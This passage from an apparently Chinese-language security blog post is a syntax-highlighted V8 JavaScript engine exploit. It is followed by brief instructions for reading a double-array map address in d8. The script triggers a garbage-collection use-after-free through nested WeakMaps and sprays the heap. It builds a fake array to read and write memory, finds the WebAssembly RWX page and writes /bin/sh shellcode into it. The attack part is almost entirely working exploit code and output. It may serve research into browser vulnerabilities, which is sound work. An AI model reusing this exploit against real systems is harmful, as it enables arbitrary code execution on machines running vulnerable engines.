class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> <span class="variable language_">module</span> = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(code);</span><br><span class="line"><span class="keyword">var</span> instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="variable language_">module</span>);</span><br><span class="line"><span class="keyword">var</span> wasmMain = instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Return values should be deleted/out of scope when gc happen, so they are not directly reachable in gc</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hideWeakMap</span>(<span class="params">map, level, initKey</span>) &#123;</span><br><span class="line"> <span class="keyword">let</span> prevMap = map;</span><br><span class="line"> <span class="keyword">let</span> prevKey = initKey;</span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; level; i++) &#123;</span><br><span class="line">   <span class="keyword">let</span> thisMap = <span class="keyword">new</span> <span class="title class_">WeakMap</span>();</span><br><span class="line">   prevMap.<span class="title function_">set</span>(prevKey, thisMap);</span><br><span class="line">   <span class="keyword">let</span> thisKey = &#123;<span class="string">&#x27;h&#x27;</span> : i&#125;;</span><br><span class="line">   <span class="comment">//make thisKey reachable via prevKey</span></span><br><span class="line">   thisMap.<span class="title function_">set</span>(prevKey, thisKey);</span><br><span class="line">   prevMap = thisMap;</span><br><span class="line">   prevKey = thisKey;</span><br><span class="line">   <span class="keyword">if</span> (i == level - <span class="number">1</span>) &#123;</span><br><span class="line">     <span class="keyword">let</span> retMap = <span class="keyword">new</span> <span class="title class_">WeakMap</span>();</span><br><span class="line">     map.<span class="title function_">set</span>(thisKey, retMap);</span><br><span class="line">     <span class="keyword">return</span> thisKey;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Get the key for the hidden map, the return key is reachable as strong ref via weak maps, but should not be directly reachable when gc happens</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getHiddenKey</span>(<span class="params">map, level, initKey</span>) &#123;</span><br><span class="line"> <span class="keyword">let</span> prevMap = map;</span><br><span class="line"> <span class="keyword">let</span> prevKey = initKey;</span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; level; i++) &#123;</span><br><span class="line">   <span class="keyword">let</span> thisMap = prevMap.<span class="title function_">get</span>(prevKey);</span><br><span class="line">   <span class="keyword">let</span> thisKey = thisMap.<span class="title function_">get</span>(prevKey);</span><br><span class="line">   prevMap = thisMap;</span><br><span class="line">   prevKey = thisKey;</span><br><span class="line">   <span class="keyword">if</span> (i == level - <span class="number">1</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span> thisKey;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setUpWeakMap</span>(<span class="params">map</span>) &#123;</span><br><span class="line"><span class="comment">//  for (let i = 0; i &lt; 1000; i++) new Array(300);</span></span><br><span class="line"> <span class="comment">//Create deep enough weak ref trees to hiddenMap so it doesn&#x27;t get discovered by concurrent marking</span></span><br><span class="line"> <span class="keyword">let</span> hk = <span class="title function_">hideWeakMap</span>(map, level, initKey);</span><br><span class="line"><span class="comment">//Round 1 maps</span></span><br><span class="line"> <span class="keyword">let</span> hiddenMap = map.<span class="title function_">get</span>(hk);</span><br><span class="line"> <span class="keyword">let</span> map7 = <span class="keyword">new</span> <span class="title class_">WeakMap</span>();</span><br><span class="line"> <span class="keyword">let</span> map8 = <span class="keyword">new</span> <span class="title class_">WeakMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//hk-&gt;k5, k5: discover-&gt;wl</span></span><br><span class="line"> <span class="keyword">let</span> k5 = &#123;k5 : <span class="number">1</span>&#125;;</span><br><span class="line"> <span class="keyword">let</span> map5 = <span class="keyword">new</span> <span class="title class_">WeakMap</span>();</span><br><span class="line"> <span class="keyword">let</span> k7 = &#123;k7 : <span class="number">1</span>&#125;;</span><br><span class="line"> <span class="keyword">let</span> k9 = &#123;k9 : <span class="number">1</span>&#125;;</span><br><span class="line"> <span class="keyword">let</span> k8 = &#123;k8 : <span class="number">1</span>&#125;;</span><br><span class="line"> <span class="keyword">let</span> ta = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="number">1024</span>);</span><br><span class="line"> ta.<span class="title function_">fill</span>(<span class="number">0xfe</span>);</span><br><span class="line"> <span class="keyword">let</span> larr = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">1</span> &lt;&lt; <span class="number">15</span>);</span><br><span class="line"> larr.<span class="title function_">fill</span>(<span class="number">1.1</span>);</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;================ double in free zone: larr&quot;</span>);</span><br><span class="line"> <span class="comment">// %DebugPrint(larr);</span></span><br><span class="line"> <span class="keyword">let</span> v9 = &#123;ta : ta, larr : larr&#125;;</span><br><span class="line"> map.<span class="title function_">set</span>(k7, map7);</span><br><span class="line"> map.<span class="title function_">set</span>(k9, v9);</span><br><span class="line"></span><br><span class="line"><span class="comment">//map3 : kb|vb: initial discovery -&gt;wl</span></span><br><span class="line"> hiddenMap.<span class="title function_">set</span>(k5, map5);</span><br><span class="line"> hiddenMap.<span class="title function_">set</span>(hk, k5);</span><br><span class="line"></span><br><span class="line"><span class="comment">//iter2: wl: discover map5, mark v6 (-&gt;k5) black, discovery: k5 black -&gt; wl</span></span><br><span class="line"><span class="comment">//iter3: wl: map5 : mark map7, k7, no discovery, iter end</span></span><br><span class="line"> map5.<span class="title function_">set</span>(hk, k7);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//Round 2: map5 becomes kb in current, initial state: k7, map7 (black), goes into wl</span></span><br><span class="line"><span class="comment">//iter1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//wl discovers map8, and mark k8 black</span></span><br><span class="line"> map7.<span class="title function_">set</span>(k8, map8);</span><br><span class="line"> map7.<span class="title function_">set</span>(k7, k8);</span><br><span class="line"></span><br><span class="line"><span class="comment">//discovery moves k8, map8 into wl</span></span><br><span class="line"><span class="comment">//iter2 marks k9 black, iter finished</span></span><br><span class="line"> map8.<span class="title function_">set</span>(k8,k9);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">var</span> dblArr = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(view);</span><br><span class="line"><span class="keyword">var</span> intView = <span class="keyword">new</span> <span class="title class_">Int32Array</span>(view);</span><br><span class="line"><span class="keyword">var</span> bigIntView = <span class="keyword">new</span> <span class="title class_">BigInt64Array</span>(view);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoi32</span>(<span class="params">f</span>) &#123;</span><br><span class="line"> dblArr[<span class="number">0</span>] = f;</span><br><span class="line"> <span class="keyword">return</span> [intView[<span class="number">0</span>], intView[<span class="number">1</span>]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i32tof</span>(<span class="params">i1, i2</span>) &#123;</span><br><span class="line"> intView[<span class="number">0</span>] = i1;</span><br><span class="line"> intView[<span class="number">1</span>] = i2;</span><br><span class="line"> <span class="keyword">return</span> dblArr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">itof</span>(<span class="params">i</span>) &#123;</span><br><span class="line"> bigIntView = <span class="title class_">BigInt</span>(i);</span><br><span class="line"> <span class="keyword">return</span> dblArr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoi</span>(<span class="params">f</span>) &#123;</span><br><span class="line"> dblArr[<span class="number">0</span>] = f;</span><br><span class="line"> <span class="keyword">return</span> bigIntView[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>) &#123;</span><br><span class="line"> <span class="comment">//trigger major GC: See https://tiszka.com/blog/CVE_2021_21225_exploit.html (Trick #2: Triggering Major GC without spraying the heap)</span></span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(gcSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">restart</span>(<span class="params"></span>) &#123;</span><br><span class="line"> <span class="comment">//Should deopt main if it gets optimized</span></span><br><span class="line"> <span class="variable language_">global</span>.<span class="property">__proto__</span> = &#123;&#125;;</span><br><span class="line"> <span class="title function_">gc</span>();</span><br><span class="line"> <span class="title function_">sleep</span>(<span class="number">2000</span>);</span><br><span class="line"> <span class="title function_">main</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">   <span class="title function_">setUpWeakMap</span>(map1);</span><br><span class="line">   <span class="comment">//sleep(2000);</span></span><br><span class="line">   <span class="title function_">gc</span>();</span><br><span class="line">   <span class="comment">//sleep(2000);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">let</span> sprayParamArr = [];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sprayParam; i++) &#123;</span><br><span class="line">     <span class="keyword">let</span> thisArr = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">1</span> &lt;&lt; <span class="number">15</span>);</span><br><span class="line">     sprayParamArr.<span class="title function_">push</span>(thisArr);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//These are there to stop main being optimized by JIT</span></span><br><span class="line">   globalIdx[<span class="string">&#x27;a&#x27;</span> + globalIdx] = <span class="number">1</span>;</span><br><span class="line">   <span class="comment">//Can&#x27;t refactor this, looks like it cause some double rounding problem (got optimized?)</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sprayParamArr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">     <span class="keyword">let</span> thisArr = sprayParamArr[i];</span><br><span class="line">     thisArr.<span class="title function_">fill</span>(instance);</span><br><span class="line">   &#125;</span><br><span class="line">   globalIdx[<span class="string">&#x27;a&#x27;</span> + globalIdx + <span class="number">1000</span>] = <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">let</span> result = <span class="literal">null</span>;</span><br><span class="line">  </span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="comment">// handle: Cannot read properties of undefined. out of order map keys</span></span><br><span class="line">     result = <span class="title function_">fetch</span>();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fetch failed&quot;</span>);</span><br><span class="line">     <span class="title function_">restart</span>();</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (!result) &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fail to find object address.&quot;</span>);</span><br><span class="line">     <span class="title function_">restart</span>();</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">let</span> larr = result.<span class="property">larr</span>;</span><br><span class="line">   <span class="keyword">let</span> index = result.<span class="property">idx</span>;</span><br><span class="line"></span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;================ double in free zone: instance&quot;</span>);</span><br><span class="line">   <span class="comment">// %DebugPrint(instance);</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// larr 里面全部存放的是instance 对象地址, index 默认为0</span></span><br><span class="line">   <span class="keyword">let</span> instanceAddr = <span class="title function_">ftoi32</span>(larr[index])[<span class="number">0</span>];</span><br><span class="line">   <span class="keyword">let</span> instanceAddr2 = <span class="title function_">ftoi32</span>(larr[index])[<span class="number">1</span>];</span><br><span class="line">   <span class="keyword">let</span> instanceFloatAddr = larr[index];</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;================found instance address: 0x&quot;</span> + instanceAddr.<span class="title function_">toString</span>(<span class="number">16</span>) + <span class="string">&quot; at index: &quot;</span> + index);</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;================found instance address2: 0x&quot;</span> + instanceAddr2.<span class="title function_">toString</span>(<span class="number">16</span>) + <span class="string">&quot; at index: &quot;</span> + index);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">let</span> x = &#123;&#125;;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sprayParamArr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">     <span class="keyword">let</span> thisArr = sprayParamArr[i];</span><br><span class="line">     thisArr.<span class="title function_">fill</span>(x);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   globalIdx[<span class="string">&#x27;a&#x27;</span> + globalIdx + <span class="number">5000</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">   larr[index] = instanceFloatAddr;</span><br><span class="line">   <span class="keyword">let</span> objArrIdx = -<span class="number">1</span>;</span><br><span class="line">   <span class="keyword">let</span> thisArrIdx = -<span class="number">1</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sprayParamArr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">     globalIdx[<span class="string">&#x27;a&#x27;</span> + globalIdx + <span class="number">3000</span>] = <span class="number">1</span>;</span><br><span class="line">     <span class="variable language_">global</span>.<span class="property">__proto__</span> = &#123;&#125;;</span><br><span class="line">     <span class="keyword">let</span> thisArr = sprayParamArr[i];</span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; thisArr.<span class="property">length</span>; j++) &#123;</span><br><span class="line">       <span class="keyword">let</span> thisObj = thisArr[j];</span><br><span class="line">       <span class="keyword">if</span> (thisObj == instance) &#123;</span><br><span class="line">         <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance object at: &quot;</span> + i + <span class="string">&quot; index: &quot;</span> + j);</span><br><span class="line">         objArrIdx = i;</span><br><span class="line">         thisArrIdx = j;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   globalIdx[<span class="string">&#x27;a&#x27;</span> + globalIdx + <span class="number">4000</span>] = <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">if</span> (objArrIdx == -<span class="number">1</span>) &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;failed getting fake object index.&quot;</span>);</span><br><span class="line">     <span class="title function_">restart</span>();</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">let</span> obj = [<span class="number">1.1</span>,<span class="number">1.2</span>,<span class="number">1.3</span>,<span class="number">0.0</span>];</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;================ obj&quot;</span>);</span><br><span class="line">   <span class="comment">// %DebugPrint(obj)</span></span><br><span class="line">   <span class="keyword">let</span> thisArr = sprayParamArr[objArrIdx];</span><br><span class="line">   thisArr.<span class="title function_">fill</span>(obj);</span><br><span class="line">   globalIdx[<span class="string">&#x27;a&#x27;</span> + globalIdx + <span class="number">2000</span>] = <span class="number">1</span>;</span><br><span class="line">   <span class="comment">// 现在larr里面填充的是obj 对象地址</span></span><br><span class="line">   <span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">let</span> addr = <span class="title function_">ftoi32</span>(larr[index])[<span class="number">0</span>];</span><br><span class="line">   <span class="keyword">let</span> objEleAddr = addr + <span class="number">0x18</span> + <span class="number">0x8</span>;</span><br><span class="line">   <span class="keyword">let</span> floatAddr = <span class="title function_">i32tof</span>(objEleAddr, objEleAddr);</span><br><span class="line">   <span class="keyword">let</span> floatMapAddr = <span class="title function_">i32tof</span>(mapAddr, mapAddr);</span><br><span class="line">   <span class="comment">//Faking an array at using obj[0] and obj[1]</span></span><br><span class="line">   obj[<span class="number">0</span>]  = floatMapAddr;</span><br><span class="line">   <span class="keyword">let</span> eleLength = <span class="title function_">i32tof</span>(instanceAddr + rwxOffset, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">   obj[<span class="number">1</span>] = eleLength;</span><br><span class="line"></span><br><span class="line">   larr[index] = floatAddr;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;array address: 0x&quot;</span> + addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;array element address: 0x&quot;</span> + objEleAddr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">   <span class="keyword">let</span> rwxAddr = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">let</span> fakeArray = sprayParamArr[objArrIdx][thisArrIdx];</span><br><span class="line">   <span class="keyword">if</span> (!(fakeArray <span class="keyword">instanceof</span> <span class="title class_">Array</span>)) &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fail getting fake array.&quot;</span>);</span><br><span class="line">     <span class="title function_">restart</span>();</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   rwxAddr = fakeArray[<span class="number">0</span>];</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;rwx address at: 0x&quot;</span> + <span class="title function_">ftoi</span>(rwxAddr).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (rwxAddr == <span class="number">0</span>) &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;failed getting rwx address.&quot;</span>);</span><br><span class="line">     <span class="title function_">restart</span>();</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//Read shellArray address</span></span><br><span class="line">   <span class="keyword">let</span> shellArray = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="number">100</span>);</span><br><span class="line">   thisArr = sprayParamArr[objArrIdx];</span><br><span class="line">   thisArr.<span class="title function_">fill</span>(shellArray);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">let</span> shellAddr = <span class="title function_">ftoi32</span>(larr[index])[<span class="number">0</span>];</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;shellArray addr: 0x&quot;</span> + shellAddr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">   obj[<span class="number">1</span>] = <span class="title function_">i32tof</span>(shellAddr + <span class="number">0x20</span>, <span class="number">10</span>);</span><br><span class="line">   fakeArray[<span class="number">0</span>] = rwxAddr;</span><br><span class="line">   <span class="keyword">var</span> shellCode = [<span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0xbb</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x56</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x5f</span>, <span class="number">0xb8</span>, <span class="number">0x3b</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0xf</span>, <span class="number">0x5</span>];</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellCode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">     shellArray[i] = shellCode[i];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="title function_">wasmMain</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findTA</span>(<span class="params">ta</span>) &#123;</span><br><span class="line">   <span class="keyword">let</span> found = <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">     <span class="keyword">if</span> (ta[i] != <span class="number">0xfe</span>) &#123;</span><br><span class="line">         <span class="variable language_">console</span>.<span class="title function_">log</span>(ta[i]);</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(ta[<span class="number">0</span>]);</span><br><span class="line">   <span class="keyword">return</span> found;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">let ta = new Uint8Array(1024);</span></span><br><span class="line"><span class="comment">   ta.fill(0xfe);</span></span><br><span class="line"><span class="comment">   let larr = new Array(1 &lt;&lt; 15);</span></span><br><span class="line"><span class="comment">   larr.fill(1.1);</span></span><br><span class="line"><span class="comment">   let v9 = &#123;ta : ta, larr : larr&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findLArr</span>(<span class="params">larr</span>) &#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; <span class="number">15</span>); i++) &#123;</span><br><span class="line">       <span class="keyword">if</span> (larr[i] != <span class="number">1.1</span>) &#123;</span><br><span class="line">         <span class="keyword">let</span> addr = <span class="title function_">ftoi32</span>(larr[i]);</span><br><span class="line">         <span class="keyword">return</span> i;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 可以正常打印，标记了，还没有真正free？</span></span><br><span class="line">        <span class="comment">//console.log(larr[i])</span></span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fetch</span>(<span class="params"></span>) &#123;</span><br><span class="line">   <span class="keyword">let</span> hiddenKey = <span class="title function_">getHiddenKey</span>(map1, level, initKey);</span><br><span class="line">   <span class="keyword">let</span> hiddenMap = map1.<span class="title function_">get</span>(hiddenKey);</span><br><span class="line">   <span class="keyword">let</span> k7 = hiddenMap.<span class="title function_">get</span>(hiddenMap.<span class="title function_">get</span>(hiddenKey)).<span class="title function_">get</span>(hiddenKey);</span><br><span class="line">   <span class="keyword">let</span> k8 = map1.<span class="title function_">get</span>(k7).<span class="title function_">get</span>(k7);</span><br><span class="line">   <span class="keyword">let</span> map8 = map1.<span class="title function_">get</span>(k7).<span class="title function_">get</span>(k8);</span><br><span class="line"></span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;===========before access free pointet 1&#x27;</span>)</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;===========before access free pointet 2&#x27;</span>)</span><br><span class="line">   <span class="keyword">let</span> larr = map1.<span class="title function_">get</span>(map8.<span class="title function_">get</span>(k8)).<span class="property">larr</span>;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;===========before findLArr&#x27;</span>)</span><br><span class="line">   <span class="keyword">let</span> index = <span class="title function_">findLArr</span>(larr);</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;===========after findLArr&#x27;</span>)</span><br><span class="line">   <span class="keyword">if</span> (index == -<span class="number">1</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> &#123;larr : larr, idx : index&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">global</span> = &#123;&#125;;</span><br><span class="line">globalIdx = <span class="number">0</span>;</span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure>

<p>注意需要修改mapAddr变量值，其是doubleArray的map地址。当前环境map地址可以通过如下命令获取：</p>
<figure class="highlight js"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// test.js</span></span><br><span class="line"><span class="keyword">let</span> obj = [<span class="number">1.1</span>, <span class="number">1.1</span>, <span class="number">1.1</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(obj);</span><br></pre></td></tr></table></figure>
<p>执行命令：<code>./out/x64.release/d8 --allow-natives-syntax test.js</code>，输出结果如下：</p>
<figure class="highlight shell"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line">base ❯ ./d8 --allow-natives-syntax test.js</span><br><span class="line">DebugPrint: 0xc83080494a1: [JSArray]</span><br><span class="line"> - map: 0x0c8308203ae1 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x0c83081cc0f9 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x0c8308049481 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x0c830800222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0xc83080048f1: [String] in ReadOnlySpace: #length: 0x0c830814215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x0c8308049481 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">         0-2: 1.1</span><br><span class="line"> &#125;</span><br><span class="line">0xc8308203ae1: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 16</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x0c8308203ab9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x0c8308142405 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors #1: 0x0c83081cc5ad &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - transitions #1: 0x0c83081cc5f9 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     0x0c830800524d &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x0c8308203b09 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x0c83081cc0f9 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x0c83081cbe95 &lt;JSFunction Array (sfi = 0xc830814adc1)&gt;</span><br><span class="line"> - dependent code: 0x0c83080021b9 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure>

